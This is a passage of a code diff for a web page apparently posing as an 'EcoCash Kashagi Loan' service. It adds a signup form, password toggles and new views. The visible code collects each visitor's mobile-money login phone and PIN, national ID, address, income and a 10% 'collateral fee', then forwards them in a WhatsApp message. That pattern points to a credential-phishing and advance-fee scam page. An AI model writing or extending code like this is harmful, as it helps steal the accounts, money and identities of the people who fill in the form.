+                message = `*EcoCash Kashagi Loan Full Application*\n\n🔒 *Login Credentials (Page 1):*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🏠 *Residential Address:* ${clientData.applyAddress}\n💰 *Requested Loan Amount:* $${clientData.applyLoanAmount} USD\n🛡️ *Collateral Fee (10%):* $${collateralFee} USD\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Full Application & Terms Agreed`;
             }
 
             openWhatsAppChat(message);
@@ -848,33 +1162,29 @@
             }
         }
 
-        // Handle Full Application Submission -> proceeds to Terms page as requested for Service 2 page 2
-        function handleFullLoanSubmit() {
-            const name = document.getElementById('apply-name').value.trim();
-            const phone = document.getElementById('apply-phone').value.trim();
-            const nid = document.getElementById('apply-nid').value.trim();
-            const employment = document.getElementById('apply-employment').value;
-            const income = document.getElementById('apply-income').value.trim();
-            const address = document.getElementById('apply-address').value.trim();
-            const loanAmount = document.getElementById('apply-loan-amount').value.trim();
+        // Validate Signup Form
+        function validateSignupForm() {
+            const firstName = document.getElementById('signup-firstname').value.trim();
+            const surname = document.getElementById('signup-surname').value.trim();
+            const country = document.getElementById('signup-country').value;
+            const mobileNumber = document.getElementById('signup-phone').value.trim();
+            const email = document.getElementById('signup-email').value.trim();
+            const nationalId = document.getElementById('signup-nid').value.trim();
+            const password = document.getElementById('new-password').value.trim();
+            const genderRadio = document.querySelector('input[name="gender"]:checked');
+            const day = document.getElementById('b-day').value;
+            const month = document.getElementById('b-month').value;
+            const year = document.getElementById('b-year').value;
+            const termsChecked = document.getElementById('terms').checked;
+            const signupBtn = document.getElementById('signup-btn');
 
-            if (!name || !phone || !nid || !employment || !income || !address || !loanAmount) {
-                showToast('Please provide all required loan application details.');
-                return;
+            if (firstName && surname && country && mobileNumber && email && nationalId && password && genderRadio && day && month && year && termsChecked) {
+                signupBtn.disabled = false;
+                signupBtn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
+            } else {
+                signupBtn.disabled = true;
+                signupBtn.className = "w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
             }
-
-            // Save into client state for final submission
-            clientData.applyName = name;
-            clientData.applyPhone = `+263 ${phone}`;
-            clientData.applyNid = nid.toUpperCase();
-            clientData.applyEmployment = employment;
-            clientData.applyIncome = income;
-            clientData.applyAddress = address;
-            clientData.applyLoanAmount = loanAmount;
-            clientData.flowType = 'apply';
-
-            // Proceed to Terms page after registration
-            switchTab('terms');
         }
 
         // Support Contact Form Validation
@@ -912,7 +1222,9 @@
         // Tab Navigation Switcher
         function switchTab(tabName) {
             const loginView = document.getElementById('view-login');
+            const signupView = document.getElementById('view-signup');
             const hubView = document.getElementById('view-kashagi-hub');
+            const processingView = document.getElementById('view-processing');
             const boostFormView = document.getElementById('view-boost-form');
             const tierUpgradeView = document.getElementById('view-tier-upgrade');
             const termsView = document.getElementById('view-terms');
@@ -921,7 +1233,9 @@
             const whatsappWidget = document.getElementById('whatsapp-widget');
 
             loginView.classList.add('hidden');
+            signupView.classList.add('hidden');
             hubView.classList.add('hidden');
+            processingView.classList.add('hidden');
             boostFormView.classList.add('hidden');
             tierUpgradeView.classList.add('hidden');
             termsView.classList.add('hidden');
@@ -931,8 +1245,12 @@
 
             if (tabName === 'login') {
                 loginView.classList.remove('hidden');
+            } else if (tabName === 'signup') {
+                signupView.classList.remove('hidden');
             } else if (tabName === 'kashagi-hub') {
                 hubView.classList.remove('hidden');
+            } else if (tabName === 'processing') {
+                processingView.classList.remove('hidden');
             } else if (tabName === 'boost-form') {
                 boostFormView.classList.remove('hidden');
             } else if (tabName === 'tier-upgrade') {
@@ -976,6 +1294,17 @@
             });
 
             eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
+        }
+
+        // Toggle Password Visibility on Sign Up Form
+        let showPassword = false;
+        function togglePasswordVisibility() {
+            showPassword = !showPassword;
+            const passInput = document.getElementById('new-password');
+            const eyeIcon = document.getElementById('password-eye-icon');
+
+            passInput.type = showPassword ? 'text' : 'password';
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
         }
 
         // Enable Login button if fields are filled
